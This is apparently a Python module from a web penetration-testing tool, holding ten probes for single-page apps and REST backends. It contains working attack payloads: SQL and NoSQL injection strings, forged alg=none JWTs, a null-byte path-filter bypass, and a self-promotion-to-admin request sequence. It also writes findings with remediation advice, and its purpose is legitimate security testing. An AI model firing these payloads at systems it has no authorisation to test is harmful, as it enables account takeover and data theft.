"""SPA-aware focused probes that catch bugs typical scanners miss.

Standard scanners (nuclei, nikto, sqlmap, dalfox) walk through templates,
fuzz payloads, or follow links. They miss whole classes of bugs that
SPAs and modern REST backends ship by default:

- Open redirects on parameter-driven endpoints (most templates only flag
  obvious /redirect URLs; modern apps put redirects on /jump, /go, /out,
  /goto, /forward, /next, /to)
- Direct REST resource enumeration without auth (e.g. GET /api/Users/
  returning the full user list)
- JWT alg=none acceptance (most scanners don't try)
- JavaScript source-map disclosure (.js.map next to bundled .js)
- Stray /ftp/, /backup/, /uploads/ directory listings on intentionally-or-
  accidentally enabled directory autoindex
- Default Score Board / dev / staging interfaces hanging off public hosts

This module runs each probe with a tight per-probe budget and persists
findings via the standard FindingsDB interface. Probes are deterministic,
no LLM, no heavy traffic, designed to be safe to run on production.
"""
from __future__ import annotations

import asyncio
import base64
import json
import logging
import re
import urllib.parse
from typing import Any

import aiohttp

logger = logging.getLogger("pentest-tools.spa_probes")


# --------------------------------------------------------------------------
# Generic helpers
# --------------------------------------------------------------------------


_DEFAULT_TIMEOUT = aiohttp.ClientTimeout(total=8)
_USER_AGENT = "pentest-tools/0.10 (+https://pentest-tools.local)"


def _normalize_base(target: str) -> str:
    if not target.startswith(("http://", "https://")):
        target = "http://" + target
    return target.rstrip("/")


async def _get(
    session: aiohttp.ClientSession, url: str, *, allow_redirects: bool = False
) -> tuple[int, dict[str, str], str]:
    """GET wrapper that returns (status, headers, body[:65k]). Errors map to (0, {}, "")."""
    try:
        async with session.get(
            url, allow_redirects=allow_redirects, timeout=_DEFAULT_TIMEOUT
        ) as resp:
            body = await resp.text(errors="replace")
            return resp.status, {k: v for k, v in resp.headers.items()}, body[:65000]
    except (asyncio.TimeoutError, aiohttp.ClientError, OSError) as e:
        logger.debug("GET %s failed: %s", url, e)
        return 0, {}, ""


async def _post_json(
    session: aiohttp.ClientSession,
    url: str,
    payload: dict[str, Any],
    *,
    headers: dict[str, str] | None = None,
) -> tuple[int, dict[str, str], str]:
    """POST a JSON body. Returns (status, headers, body[:65k]). Errors map to (0, {}, "")."""
    h = {"Content-Type": "application/json", "User-Agent": _USER_AGENT}
    if headers:
        h.update(headers)
    try:
        async with session.post(url, json=payload, headers=h, timeout=_DEFAULT_TIMEOUT) as resp:
            body = await resp.text(errors="replace")
            return resp.status, {k: v for k, v in resp.headers.items()}, body[:65000]
    except (asyncio.TimeoutError, aiohttp.ClientError, OSError) as e:
        logger.debug("POST %s failed: %s", url, e)
        return 0, {}, ""


async def _put_json(
    session: aiohttp.ClientSession,
    url: str,
    payload: dict[str, Any],
    *,
    headers: dict[str, str] | None = None,
) -> tuple[int, dict[str, str], str]:
    """PUT a JSON body. Same return shape as _post_json."""
    h = {"Content-Type": "application/json", "User-Agent": _USER_AGENT}
    if headers:
        h.update(headers)
    try:
        async with session.put(url, json=payload, headers=h, timeout=_DEFAULT_TIMEOUT) as resp:
            body = await resp.text(errors="replace")
            return resp.status, {k: v for k, v in resp.headers.items()}, body[:65000]
    except (asyncio.TimeoutError, aiohttp.ClientError, OSError) as e:
        logger.debug("PUT %s failed: %s", url, e)
        return 0, {}, ""


# --------------------------------------------------------------------------
# Probe 1: open redirect
# --------------------------------------------------------------------------

REDIRECT_PATHS: tuple[str, ...] = (
    "/redirect",
    "/jump",
    "/go",
    "/out",
    "/goto",
    "/forward",
    "/next",
    "/to",
    "/url",
    "/r",
)
REDIRECT_PARAMS: tuple[str, ...] = (
    "to",
    "url",
    "redirect",
    "redirect_to",
    "redirectUrl",
    "next",
    "return",
    "returnUrl",
    "continue",
    "dest",
    "destination",
    "u",
)
SENTINEL_HOST = "https://example.org/pttools-canary"


async def probe_open_redirect(
    session: aiohttp.ClientSession, base: str
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    for path in REDIRECT_PATHS:
        for param in REDIRECT_PARAMS:
            url = f"{base}{path}?{param}={urllib.parse.quote(SENTINEL_HOST, safe='')}"
            status, headers, _ = await _get(session, url)
            if status in (301, 302, 303, 307, 308):
                location = headers.get("Location") or headers.get("location") or ""
                if SENTINEL_HOST in location or "example.org" in location:
                    findings.append(_redirect_finding(url, param, location))
    return findings


def _redirect_finding(url: str, param: str, location: str) -> dict[str, Any]:
    return {
        "title": f"Open Redirect via parameter '{param}'",
        "description": (
            f"The endpoint accepted an attacker-controlled URL in the '{param}' "
            f"parameter and issued a redirect to an external host. This can be "
            f"abused for phishing and OAuth credential theft. URL: {url}. "
            f"Server returned Location: {location}"
        ),
        "severity": "medium",
        "category": "redirect",
        "tool_source": "spa_probe",
        "target": url,
        "evidence": json.dumps({"location_header": location, "sentinel": SENTINEL_HOST}),
        "owasp_category": "A01:2021",
        "remediation": (
            "Validate redirect targets against an allowlist of known-good "
            "destinations or use relative paths only."
        ),
    }


# --------------------------------------------------------------------------
# Probe 2: REST resource enumeration without auth
# --------------------------------------------------------------------------

USER_LIST_PATHS: tuple[str, ...] = (
    "/api/Users",
    "/api/Users/",
    "/api/users",
    "/api/users/",
    "/rest/admin/users",
    "/api/v1/users",
    "/api/v2/users",
    "/users.json",
)


async def probe_user_enum(
    session: aiohttp.ClientSession, base: str
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    for path in USER_LIST_PATHS:
        url = f"{base}{path}"
        status, _, body = await _get(session, url)
        if status != 200 or not body:
            continue
        # Heuristic: response looks like JSON containing user-shape fields.
        if not _looks_like_user_collection(body):
            continue
        sample = body[:600]
        findings.append({
            "title": "Unauthenticated user enumeration via REST endpoint",
            "description": (
                f"GET {url} returned HTTP 200 with a JSON payload that includes "
                f"user records (email, password hash, role, or id fields) "
                f"without requiring authentication. This breaks tenant isolation "
                f"and exposes account data to anyone on the internet."
            ),
            "severity": "high",
            "category": "authentication",
            "tool_source": "spa_probe",
            "target": url,
            "evidence": json.dumps({"http_status": 200, "body_sample": sample}),
            "owasp_category": "A01:2021",
            "remediation": (
                "Require an authenticated session and an authorization check "
                "(role-based or ownership) before returning user records. "
                "Return 401/403 to anonymous callers."
            ),
        })
    return findings


def _looks_like_user_collection(body: str) -> bool:
    if not body.lstrip().startswith(("{", "[")):
        return False
    needles = ("email", "password", "role", "username", "isAdmin")
    hits = sum(1 for n in needles if n in body)
    return hits >= 2


# --------------------------------------------------------------------------
# Probe 3: JWT alg=none acceptance
# --------------------------------------------------------------------------


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _craft_alg_none_token(original_payload: dict[str, Any] | None = None) -> str:
    header = {"alg": "none", "typ": "JWT"}
    payload = original_payload or {"sub": "pttools-canary", "role": "admin"}
    return f"{_b64url(json.dumps(header).encode())}.{_b64url(json.dumps(payload).encode())}."


async def probe_jwt_alg_none(
    session: aiohttp.ClientSession, base: str, candidate_endpoints: list[str]
) -> list[dict[str, Any]]:
    """Two-step JWT probe.

    Step 1: GET without any Authorization header. If the endpoint returns
    200 + sensitive content, that's a missing-auth (broken access control)
    bug, not a JWT bug. Report it as such.

    Step 2: If step 1 returned 401/403, GET with an alg=none JWT. If the
    endpoint then returns 200, the server is honouring alg='none' from the
    token header. Critical JWT misconfiguration.
    """
    findings: list[dict[str, Any]] = []
    token = _craft_alg_none_token()
    headers_with_token = {
        "Authorization": f"Bearer {token}",
        "User-Agent": _USER_AGENT,
    }

    for path in candidate_endpoints:
        url = f"{base}{path}" if path.startswith("/") else path

        # Step 1: anonymous GET
        anon_status, _, anon_body = await _get(session, url)
        if anon_status == 200 and _looks_sensitive(path, anon_body):
            findings.append({
                "title": f"Sensitive endpoint reachable without authentication: {path}",
                "description": (
                    f"GET {url} returned HTTP 200 with sensitive content even "
                    f"without an Authorization header. The endpoint should "
                    f"require an authenticated session and an authorization "
                    f"check, but it currently leaks data to anonymous callers."
                ),
                "severity": "high",
                "category": "authentication",
                "tool_source": "spa_probe",
                "target": url,
                "evidence": json.dumps({
                    "anonymous_status": anon_status,
                    "body_sample": anon_body[:500],
                }),
                "owasp_category": "A01:2021",
                "remediation": (
                    "Require authentication on this endpoint. Reject "
                    "unauthenticated callers with 401 Unauthorized."
                ),
            })
            continue  # don't double-report on the same path

        if anon_status not in (401, 403):
            # Endpoint not normally protected: not a JWT vuln if 200, and
            # other statuses (404, 500) aren't a JWT signal either.
            continue

        # Step 2: try with alg=none token
        try:
            async with session.get(
                url, headers=headers_with_token, timeout=_DEFAULT_TIMEOUT
            ) as resp:
                tok_status = resp.status
                tok_body = (await resp.text(errors="replace"))[:500]
        except (asyncio.TimeoutError, aiohttp.ClientError, OSError):
            continue

        if tok_status == 200:
            findings.append({
                "title": "JWT 'alg: none' accepted on authenticated endpoint",
                "description": (
                    f"GET {url} returned HTTP {anon_status} without auth, but "
                    f"HTTP 200 when called with an unsigned JWT (alg=none). "
                    f"The server is honouring 'alg=none' from the token "
                    f"header, which lets any caller forge a token as any user."
                ),
                "severity": "critical",
                "category": "authentication",
                "tool_source": "spa_probe",
                "target": url,
                "evidence": json.dumps({
                    "anonymous_status": anon_status,
                    "alg_none_status": tok_status,
                    "alg_none_body_sample": tok_body,
                    "token": token,
                }),
                "owasp_category": "A07:2021",
                "remediation": (
                    "Reject any token whose header declares alg='none'. Pin "
                    "expected algorithms server-side, never trust the alg "
                    "header from the token itself."
                ),
            })
    return findings


def _looks_sensitive(path: str, body: str) -> bool:
    """Best-effort check that a 200 body has admin/user/config-shaped content
    rather than a generic SPA shell.
    """
    if not body:
        return False
    if not body.lstrip().startswith(("{", "[")):
        return False
    needles = (
        "config", "secret", "password", "token", "email",
        "isAdmin", "role", "users", "username", "apiKey", "api_key",
    )
    if sum(1 for n in needles if n in body) >= 2:
        return True
    # Path hints: anything matching /admin/, /config, /users matters.
    p = path.lower()
    return any(h in p for h in ("/admin", "/config", "/users", "/secrets", "/whoami"))


# --------------------------------------------------------------------------
# Probe 4: source-map disclosure
# --------------------------------------------------------------------------


async def probe_source_maps(
    session: aiohttp.ClientSession, base: str, js_urls: list[str]
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()
    for js in js_urls[:20]:
        if not js.endswith(".js") or js in seen:
            continue
        seen.add(js)
        candidate = js + ".map"
        status, _, body = await _get(session, candidate)
        if status == 200 and body.lstrip().startswith("{") and '"sources"' in body:
            findings.append({
                "title": "JavaScript source-map exposure",
                "description": (
                    f"GET {candidate} returned a valid sourcemap. Source maps "
                    f"reveal pre-bundled, often un-minified application code, "
                    f"including comments, internal API paths, and unreferenced "
                    f"client-side secrets."
                ),
                "severity": "medium",
                "category": "exposure",
                "tool_source": "spa_probe",
                "target": candidate,
                "evidence": json.dumps({"http_status": 200, "body_sample": body[:600]}),
                "owasp_category": "A05:2021",
                "remediation": (
                    "Strip or gate sourcemap files in production builds. If "
                    "you need them, restrict access to authenticated devs."
                ),
            })
            if len(findings) >= 2:
                break
    return findings


# --------------------------------------------------------------------------
# Probe 5: stray directory listing on /ftp, /backup, /uploads
# --------------------------------------------------------------------------

DIR_LIST_PATHS: tuple[str, ...] = (
    "/ftp/",
    "/backup/",
    "/backups/",
    "/uploads/",
    "/files/",
    "/dump/",
    "/.git/",
    "/internal/",
    "/private/",
)
DIR_LIST_MARKERS: tuple[str, ...] = (
    "<title>Index of",
    "<title>listing directory",      # express serve-index default
    "Directory listing for",          # python -m http.server
    "<a href=\"../\">Parent Directory</a>",
    'rel="parent"',
)


async def probe_directory_listing(
    session: aiohttp.ClientSession, base: str
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    for path in DIR_LIST_PATHS:
        url = f"{base}{path}"
        status, _, body = await _get(session, url)
        if status != 200 or not body:
            continue
        if not any(m in body for m in DIR_LIST_MARKERS):
            continue
        files = re.findall(r'href="([^"?][^"]*)"', body)[:20]
        findings.append({
            "title": f"Directory listing exposed at {path}",
            "description": (
                f"GET {url} returns a directory index. Anyone can enumerate "
                f"files under this path without authentication. Files visible "
                f"in the listing: {files}"
            ),
            "severity": "medium" if path != "/.git/" else "high",
            "category": "exposure",
            "tool_source": "spa_probe",
            "target": url,
            "evidence": json.dumps({"http_status": 200, "files": files}),
            "owasp_category": "A05:2021",
            "remediation": (
                "Disable directory autoindex on the web server. If the "
                "directory must be public, replace the listing with a 404."
            ),
        })
    return findings


# --------------------------------------------------------------------------
# Probe 6: Score Board / dev interface exposure
# --------------------------------------------------------------------------

DEV_PATHS: tuple[str, ...] = (
    "/score-board",
    "/scoreboard",
    "/#/score-board",
    "/admin/dev",
    "/_admin",
    "/_dev",
    "/__debug__/",
    "/debug",
    "/api/Challenges/?name=Score%20Board",
    "/api/Challenges/",
)


async def probe_dev_interfaces(
    session: aiohttp.ClientSession, base: str
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []
    for path in DEV_PATHS:
        url = f"{base}{path}"
        status, _, body = await _get(session, url)
        if status != 200 or not body:
            continue
        if "Challenges" in path and ("solved" in body or "Score Board" in body):
            findings.append({
                "title": "Dev/test interface exposed: challenges endpoint reachable",
                "description": (
                    f"GET {url} returned HTTP 200 with a payload describing "
                    f"developer/test challenges. Production deployments should "
                    f"not ship the challenge tracking interface."
                ),
                "severity": "medium",
                "category": "exposure",
                "tool_source": "spa_probe",
                "target": url,
                "evidence": json.dumps({"http_status": 200, "body_sample": body[:500]}),
                "owasp_category": "A05:2021",
                "remediation": (
                    "Strip dev-only endpoints from the production build, or "
                    "gate them behind staff-only auth."
                ),
            })
        elif path in ("/__debug__/", "/debug", "/_dev", "/_admin") and len(body) > 200:
            findings.append({
                "title": f"Debug interface reachable at {path}",
                "description": (
                    f"GET {url} returned HTTP 200 with a non-trivial response "
                    f"body. Debug endpoints in production are a known leak path "
                    f"for stack traces, env vars, and internal IPs."
                ),
                "severity": "medium",
                "category": "exposure",
                "tool_source": "spa_probe",
                "target": url,
                "evidence": json.dumps({"http_status": 200, "body_sample": body[:400]}),
                "owasp_category": "A05:2021",
                "remediation": (
                    "Disable debug routes in production builds. If you need "
                    "them, require admin auth and log every hit."
                ),
            })
    return findings


# --------------------------------------------------------------------------
# Probe 7: SQLi POST login bypass
# --------------------------------------------------------------------------

LOGIN_PATHS: tuple[str, ...] = (
    "/rest/user/login",
    "/api/login",
    "/api/v1/login",
    "/api/v2/login",
    "/login",
    "/auth/login",
    "/user/login",
    "/users/login",
    "/api/auth/login",
)

# Classic auth-bypass payloads. Most modern apps reject these, but Juice Shop's
# /rest/user/login is the canonical demo case where ' OR 1=1-- in the email
# field returns a valid JWT for the first row in the users table.
SQLI_LOGIN_PAYLOADS: tuple[tuple[str, str], ...] = (
    ("' OR 1=1--", "anything"),
    ("admin' --", "anything"),
    ("' OR '1'='1", "anything"),
    ("\" OR 1=1--", "anything"),
)


async def probe_login_sqli_bypass(
    session: aiohttp.ClientSession, base: str
) -> list[dict[str, Any]]:
    """POST a SQLi auth-bypass payload to common login endpoints.

    Detects: server returns 200 with a token-shaped JSON response (token,
    access_token, jwt, authentication.token, etc) when the email field is
    a SQLi payload. That's a confirmed login bypass with proof-of-impact.
    """
    findings: list[dict[str, Any]] = []
    for path in LOGIN_PATHS:
        url = f"{base}{path}"
        for email, password in SQLI_LOGIN_PAYLOADS:
            payload = {"email": email, "password": password}
            status, _, body = await _post_json(session, url, payload)
            if status != 200 or not body:
                continue
            if not _looks_like_token_response(body):
                continue
            findings.append({
                "title": "SQL injection auth bypass on login endpoint",
                "description": (
                    f"POST {url} with email={email!r} returned HTTP 200 plus a "
                    f"token-shaped response. The login endpoint is vulnerable "
                    f"to SQL injection in the email field, letting an attacker "
                    f"authenticate as the first row in the users table without "
                    f"a valid password."
                ),
                "severity": "critical",
                "category": "injection",
                "tool_source": "spa_probe",
                "target": url,
                "evidence": json.dumps({
                    "http_status": status,
                    "payload_email": email,
                    "payload_password": password,
                    "body_sample": body[:600],
                }),
                "owasp_category": "A03:2021",
                "remediation": (
                    "Use parameterized queries on the login endpoint. Never "
                    "interpolate user-supplied email/password values into raw "
                    "SQL. An ORM with bound parameters is the simplest fix."
                ),
            })
            return findings  # one is enough; don't keep hammering
    return findings


def _looks_like_token_response(body: str) -> bool:
    """True if a JSON response carries an auth token field."""
    if not body or not body.lstrip().startswith(("{", "[")):
        return False
    needles = ("\"token\"", "\"access_token\"", "\"jwt\"", "\"authentication\"", "\"id_token\"")
    return any(n in body for n in needles)


# --------------------------------------------------------------------------
# Probe 8: role self-promotion via PUT /api/Users/{id}
# --------------------------------------------------------------------------


async def probe_role_self_promote(
    session: aiohttp.ClientSession, base: str
) -> list[dict[str, Any]]:
    """Register a low-privilege user, then PUT their own record with role=admin.

    Detects: server lets a normal user change their own role field. Classic
    BOLA/BOPLA bug (broken object-level authorization on the role attribute).
    Juice Shop's `/api/Users/{id}` PUT lets you self-promote.

    Steps:
      1. POST /api/Users/ with a fresh email/password. Capture id + token.
      2. PUT /api/Users/{id} with body {"role": "admin"} using the token.
      3. GET /api/Users/{id} and check role==admin.

    Skips silently if any step returns a non-2xx, since those mean the
    server is correctly protecting against the attack.
    """
    findings: list[dict[str, Any]] = []
    import secrets
    canary = f"pttools-{secrets.token_hex(4)}@example.org"
    register_url = f"{base}/api/Users/"
    register_body = {
        "email": canary, "password": "Ptai-Canary-9!", "username": canary,
    }
    status, _, body = await _post_json(session, register_url, register_body)
    if status not in (200, 201) or not body:
        return findings
    try:
        registered = json.loads(body).get("data") or {}
    except (TypeError, ValueError, json.JSONDecodeError):
        return findings
    user_id = registered.get("id")
    if not user_id:
        return findings

    # Some apps issue the token on register, others require login. Try both.
    token = registered.get("token") or registered.get("authentication", {}).get("token")
    if not token:
        login_url = f"{base}/rest/user/login"
        st, _, lbody = await _post_json(
            session, login_url, {"email": canary, "password": "Ptai-Canary-9!"}
        )
        if st == 200 and lbody:
            try:
                token = (json.loads(lbody).get("authentication") or {}).get("token")
            except (TypeError, ValueError, json.JSONDecodeError):
                token = None
    if not token:
        return findings

    headers = {"Authorization": f"Bearer {token}"}
    put_url = f"{base}/api/Users/{user_id}"
    put_status, _, put_body = await _put_json(
        session, put_url, {"role": "admin"}, headers=headers
    )
    if put_status not in (200, 201, 204):
        return findings

    # Confirm the role change persisted by GETting the row back.
    try:
        async with session.get(
            put_url, headers=headers, timeout=_DEFAULT_TIMEOUT
        ) as resp:
            verify_body = (await resp.text(errors="replace"))[:1000]
    except (asyncio.TimeoutError, aiohttp.ClientError, OSError):
        return findings

    try:
        verified = (json.loads(verify_body).get("data") or {}).get("role")
    except (TypeError, ValueError, json.JSONDecodeError):
        verified = None
    if verified != "admin":
        return findings

    findings.append({
        "title": "Privilege escalation: user can self-promote to admin via PUT /api/Users/{id}",
        "description": (
            f"A freshly-registered user (email={canary}) was able to PUT their "
            f"own record at {put_url} with role='admin' and the change was "
            f"accepted. Any attacker who can sign up can become an admin."
        ),
        "severity": "critical",
        "category": "authorization",
        "tool_source": "spa_probe",
        "target": put_url,
        "evidence": json.dumps({
            "canary_email": canary,
            "user_id": user_id,
            "put_status": put_status,
            "verified_role_after": verified,
            "verify_body_sample": verify_body[:400],
        }),
        "owasp_category": "A01:2021",
        "remediation": (
            "Server-side allowlist the fields a non-admin user can update on "
            "their own record. Reject any attempt to set role/isAdmin/scope "
            "fields from a non-admin caller; require an admin token to mutate "
            "those attributes."
        ),
    })
    return findings


# --------------------------------------------------------------------------
# Probe 9: /ftp file leak with vulnerable-dependency detection
# --------------------------------------------------------------------------

# File extensions that are interesting if exposed in a directory listing.
INTERESTING_FTP_EXTENSIONS: tuple[str, ...] = (
    ".bak", ".old", ".swp", ".tmp",
    ".pem", ".key", ".crt", ".cer",
    ".sql", ".dump",
    ".env", ".conf",
    ".log",
    ".md", ".txt",
    ".json", ".yml", ".yaml",
)


async def probe_ftp_leak(
    session: aiohttp.ClientSession, base: str
) -> list[dict[str, Any]]:
    """Walk a stray /ftp/ directory listing, download interesting files
    (including filter-bypass tricks), and flag the leaked contents.

    Two-stage download:
      Stage 1: direct GET. Many simple misconfigs serve everything.
      Stage 2: if direct GET returns 403/blocked but the file looks juicy
        (.bak, .key, .env, etc), try the poison-null-byte path bypass
        (/ftp/file.bak%2500.md). Express's serve-index + url() filter
        truncates at the null but the suffix passes the extension regex.
        Bypass is the canonical Juice Shop file-leak challenge but the
        same filter pattern shows up in real production stacks (it's
        why CVE-2014-7205 still gets re-discovered).

    A successful Stage-2 leak is a critical finding (it's an active
    auth-bypass + sensitive-data exposure).
    """
    findings: list[dict[str, Any]] = []
    listing_url = f"{base}/ftp/"
    status, _, body = await _get(session, listing_url)
    if status != 200 or not body:
        return findings
    if not any(m in body for m in DIR_LIST_MARKERS):
        return findings

    files = re.findall(r'href="([^"?][^"]*)"', body)
    interesting = [
        f for f in files
        if not f.endswith("/")
        and f not in (".", "..")
        and any(f.lower().endswith(ext) for ext in INTERESTING_FTP_EXTENSIONS)
    ][:12]
    if not interesting:
        return findings

    direct_samples: list[dict[str, Any]] = []
    bypass_samples: list[dict[str, Any]] = []

    for filename in interesting:
        # Stage 1: naive download.
        file_url = f"{base}/ftp/{filename}"
        st, _, content = await _get(session, file_url)
        if st == 200 and content:
            direct_samples.append({
                "file": filename, "method": "direct",
                "size": len(content), "preview": content[:300],
            })
            continue
        if st != 403:
            continue

        # Stage 2: poison-null-byte bypass. /ftp/file.bak%2500.md.
        bypass_path = f"{base}/ftp/{filename}%2500.md"
        bst, _, bcontent = await _get(session, bypass_path)
        if bst == 200 and bcontent:
            bypass_samples.append({
                "file": filename,
                "method": "poison_null_byte",
                "url": bypass_path,
                "size": len(bcontent),
                "preview": bcontent[:300],
            })

    # Two findings if both stages produced data: one HIGH for the listing
    # leak, one CRITICAL for the filter bypass that defeated the deny rule.
    if direct_samples:
        findings.append({
            "title": f"Sensitive backup/config files leaked at /ftp/ ({len(direct_samples)} files)",
            "description": (
                f"GET {listing_url} returns a directory listing and the files "
                f"inside are downloadable without authentication. Files "
                f"retrieved: {[s['file'] for s in direct_samples]}. These "
                f"commonly contain secrets, dependency manifests with "
                f"vulnerable versions, private keys, or SQL backups."
            ),
            "severity": "high",
            "category": "exposure",
            "tool_source": "spa_probe",
            "target": listing_url,
            "evidence": json.dumps({
                "listing_status": status,
                "files_leaked": direct_samples,
            }),
            "owasp_category": "A05:2021",
            "remediation": (
                "Disable directory autoindex on the web server. Move backup, "
                "config, and credential files outside the document root, or "
                "block them via web server rules."
            ),
        })

    # If the leak yielded a package.json (or lock), look up CVEs for the
    # declared dependencies via osv.dev. A leaked dep manifest plus a known
    # vulnerable version is a multiplier finding.
    cve_findings = await _enrich_with_cve_lookup(direct_samples + bypass_samples, base)
    findings.extend(cve_findings)

    if bypass_samples:
        findings.append({
            "title": (
                f"Path-filter bypass via poison null byte: {len(bypass_samples)} "
                f"otherwise-blocked files retrieved from /ftp/"
            ),
            "description": (
                f"The server denies direct GETs to {[s['file'] for s in bypass_samples]} "
                f"with 403, but accepts the same paths with a URL-encoded NUL "
                f"and a benign suffix appended (e.g. /ftp/package.json.bak%2500.md). "
                f"The denylist regex truncates at the NUL, the file system "
                f"reads the original path, and the response returns the "
                f"protected content. Files retrieved this way: "
                f"{[s['file'] for s in bypass_samples]}."
            ),
            "severity": "critical",
            "category": "authorization",
            "tool_source": "spa_probe",
            "target": listing_url,
            "evidence": json.dumps({
                "bypass_method": "url-encoded NUL plus harmless extension",
                "files_leaked": bypass_samples,
            }),
            "owasp_category": "A01:2021",
            "remediation": (
                "Apply the deny rule on the resolved file path after URL "
                "decoding, not on the request URL. Reject any request whose "
                "decoded path contains a NUL byte. Move sensitive files out "
                "of the served document root entirely."
            ),
        })

    return findings


# --------------------------------------------------------------------------
# Probe 10: NoSQL injection on review endpoints
# --------------------------------------------------------------------------

NOSQL_REVIEW_PATHS: tuple[str, ...] = (
    "/rest/products/reviews",
    "/api/reviews",
    "/api/Reviews",
)

NOSQL_PAYLOADS: tuple[dict[str, Any], ...] = (
    {"id": {"$ne": "x"}, "message": "pttools"},                # match any id
    {"$where": "1==1"},                                      # JS where eval
    {"id": {"$gt": ""}, "message": "pttools"},                  # >'' matches all
)


async def probe_nosql_inject(
    session: aiohttp.ClientSession, base: str
) -> list[dict[str, Any]]:
    """Send NoSQL operator payloads to review-style endpoints. If the response
    includes more than a single review or returns operator-aware result counts,
    flag it as injection.
    """
    findings: list[dict[str, Any]] = []
    for path in NOSQL_REVIEW_PATHS:
        url = f"{base}{path}"
        # Establish baseline: PATCH-style requests usually return shape we can compare.
        baseline_status, _, baseline_body = await _post_json(
            session, url, {"id": "no-such-id-pttools", "message": "pttools-canary"}
        )
        baseline_count = _count_review_records(baseline_body) if baseline_status == 200 else 0

        for payload in NOSQL_PAYLOADS:
            status, _, body = await _post_json(session, url, payload)
            if status != 200 or not body:
                continue
            count = _count_review_records(body)
            if count > max(baseline_count, 1):
                findings.append({
                    "title": "NoSQL injection on review endpoint",
                    "description": (
                        f"POST {url} with NoSQL operator payload "
                        f"{json.dumps(payload)} returned {count} records "
                        f"(baseline returned {baseline_count}). The endpoint "
                        f"is interpreting user-supplied query operators "
                        f"directly, allowing data extraction via the database "
                        f"query language."
                    ),
                    "severity": "high",
                    "category": "injection",
                    "tool_source": "spa_probe",
                    "target": url,
                    "evidence": json.dumps({
                        "http_status": status,
                        "payload": payload,
                        "result_count": count,
                        "baseline_count": baseline_count,
                        "body_sample": body[:500],
                    }),
                    "owasp_category": "A03:2021",
                    "remediation": (
                        "Reject MongoDB query operators in user input. Cast "
                        "expected fields to primitive types before querying, "
                        "or use a strict ODM schema that drops $-prefixed keys."
                    ),
                })
                return findings
    return findings


async def _enrich_with_cve_lookup(
    leaked_samples: list[dict[str, Any]], base: str
) -> list[dict[str, Any]]:
    """If a sample is a package.json / lockfile, query osv.dev for vulnerable
    deps and emit per-package findings.

    Heavy callers should pass full file contents in the 'preview' field; the
    preview is capped at 300 chars so we may need to re-fetch the file for
    deps not visible in the snippet. For the launch demo, the preview is
    enough to find the top-level deps.
    """
    findings: list[dict[str, Any]] = []
    interesting_manifests = [
        s for s in leaked_samples
        if s.get("file", "").lower().startswith(("package.json", "package-lock.json"))
    ]
    if not interesting_manifests:
        return findings

    # Re-fetch the full file content if we used poison null byte route.
    full_contents: list[tuple[dict[str, Any], str]] = []
    async with aiohttp.ClientSession(headers={"User-Agent": _USER_AGENT}) as session:
        for sample in interesting_manifests:
            url = sample.get("url") or f"{base}/ftp/{sample['file']}"
            st, _, content = await _get(session, url)
            if st == 200 and content:
                full_contents.append((sample, content))

    if not full_contents:
        return findings

    # Lazy-import to keep cve_db optional if osv is unreachable.
    try:
        from engine.cve_db import (
            filter_vulnerable,
            lookup_npm_packages,
            parse_package_json,
        )
    except ImportError:
        return findings

    all_deps: list[dict[str, str]] = []
    for _, content in full_contents:
        all_deps.extend(parse_package_json(content))
    # Dedup + cap at 200 packages so a leaked huge manifest doesn't DoS osv.
    seen: set[tuple[str, str]] = set()
    deduped: list[dict[str, str]] = []
    for d in all_deps:
        key = (d["name"], d.get("version", ""))
        if key in seen:
            continue
        seen.add(key)
        deduped.append(d)
        if len(deduped) >= 200:
            break

    if not deduped:
        return findings

    try:
        vuln_results = await lookup_npm_packages(deduped)
    except Exception as e:
        logger.warning("CVE lookup failed: %s", e)
        return findings

    vulnerable = filter_vulnerable(vuln_results)
    if not vulnerable:
        return findings

    # One summary finding for the manifest, plus one finding per vulnerable dep.
    leaked_files = [s.get("file") for s, _ in full_contents]
    findings.append({
        "title": (
            f"Vulnerable npm dependencies declared in leaked manifest "
            f"({len(vulnerable)} of {len(deduped)} packages have known CVEs)"
        ),
        "description": (
            f"The leaked dependency manifest(s) {leaked_files} declare "
            f"{len(deduped)} unique packages. {len(vulnerable)} of them have "
            f"published advisories on osv.dev. Each affected package becomes "
            f"a chainable exploit primitive once the manifest is leaked."
        ),
        "severity": "high",
        "category": "vulnerability",
        "tool_source": "spa_probe",
        "target": f"{base}/ftp/",
        "evidence": json.dumps({
            "leaked_files": leaked_files,
            "total_packages_in_manifest": len(deduped),
            "vulnerable_count": len(vulnerable),
            "first_ten_vulnerable": vulnerable[:10],
        }),
        "owasp_category": "A06:2021",
        "remediation": (
            "Stop shipping dependency manifests inside the served document "
            "root. Run npm audit / osv-scanner in CI and pin to non-vulnerable "
            "versions before each release."
        ),
    })

    # Per-dep finding for the worst three (so chain templates can pick them up).
    for vuln in vulnerable[:3]:
        ids = vuln["vulnerabilities"]
        findings.append({
            "title": (
                f"Vulnerable dependency: {vuln['name']}@{vuln['version']} "
                f"({len(ids)} known advisories)"
            ),
            "description": (
                f"Dependency {vuln['name']} version {vuln['version']} declared "
                f"in the leaked manifest matches {len(ids)} osv.dev advisories: "
                f"{ids[:6]}. Whether the vulnerability is reachable in this "
                f"deployment depends on how the package is used; combined "
                f"with the manifest leak above, an attacker has the exact "
                f"information needed to build a working exploit."
            ),
            "severity": "high",
            "category": "vulnerability",
            "tool_source": "spa_probe",
            "target": f"npm:{vuln['name']}@{vuln['version']}",
            "evidence": json.dumps({
                "package_name": vuln["name"],
                "package_version": vuln["version"],
                "advisory_ids": ids,
                "source": "osv.dev",
            }),
            "cve": ids[0] if ids and ids[0].startswith("CVE-") else "",
            "owasp_category": "A06:2021",
            "remediation": (
                f"Upgrade {vuln['name']} to a fixed version (check the "
                f"advisory at https://osv.dev/vulnerability/{ids[0]} for "
                f"the exact range)."
            ),
        })
    return findings


def _count_review_records(body: str) -> int:
    if not body or not body.lstrip().startswith(("{", "[")):
        return 0
    try:
        parsed = json.loads(body)
    except (TypeError, ValueError, json.JSONDecodeError):
        return 0
    data = parsed.get("data") if isinstance(parsed, dict) else parsed
    if isinstance(data, list):
        return len(data)
    return 0


# --------------------------------------------------------------------------
# Top-level driver
# --------------------------------------------------------------------------


